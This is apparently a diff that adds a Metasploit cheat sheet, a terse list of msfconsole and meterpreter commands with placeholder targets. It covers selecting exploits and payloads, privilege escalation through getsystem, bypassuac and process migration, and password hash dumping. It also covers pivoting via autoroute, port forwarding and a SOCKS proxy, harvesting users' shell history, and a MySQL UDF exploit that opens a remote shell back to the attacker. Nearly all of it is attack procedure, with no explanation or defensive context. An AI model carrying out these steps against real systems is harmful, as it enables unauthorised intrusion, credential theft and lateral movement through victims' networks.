@@ -1,0 +1,69 @@
+ > show -h                                     // list all parameters
+  > search <string>                             // search for module in metasploit
+  > search <string 1> <string 2> <string n>     // gives back foundings of all strings
+  > use <path to exploit>
+  > back                                        // goes out of the module
+  > info                                        // provides info for the module selected
+  > show options                                // show options, which can be set
+  > set <eg RHOST>                              // set value for the module selected
+  
+  > show payloads
+  > set payload <path to payload module>
+  > set <eg LPORT>
+  > exploit
+  
+  > sysinfo
+  > getuid
+  > ifconfig
+  > route
+  > getsystem
+  > ps
+  > getpid
+  
+  > run post/windows/gather/win_privs
+  > search bypassuac
+  > exploit
+  > getuid
+  > run post/windows/gather/win_privs
+  > getsystem
+  > ps -U SYSTEM
+  > migrate <PID> 
+  
+  > autoroute:
+    > in meterpreter shell:
+      > run autoroute -s <IP of new Subnet> -n <Subnet Mask>  
+  > portfwd 
+    > portfwd add -l <listening port> -p <remote port> -r <target ip>
+    > scan localhost <listening port> to scan the target port
+    > use modules again with remote ip and original port
+  > socks_proxy
+    > use auxiliary/server/socks_proxy
+    > set VERSION 4a
+    > set SRVPORT 9050
+    > run -j
+    > proxychains nmap -sT -P0 <target ip>
+  
+  > search hashdump
+  
+  > upload / downlaod       // '\' Characters must be escaped -> eg 'C:\\Windows'
+
+  > shell                   // interactive shell
+  
+  > post/multi/manage/shell_to_meterpreter
+  
+  > search for history bash files in msfconsole:
+   > gather session to victim
+   > use post/linux/gather/enum_users_history
+    > set session <session ID>
+  > run
+  
+  > mysql remote shell via msfconsole:
+  > gather user and pass for login
+  > use exploit/multi/mysql/mysql_udf_payload
+  > set FORCE_UDF_UPLOAD true
+  > set PASSWORD <Password>
+  > set RHOSTS <victim ip>
+  > set TARGET 1
+  > set LHOST <local ip>
+  > exploit
+  > session -i 2
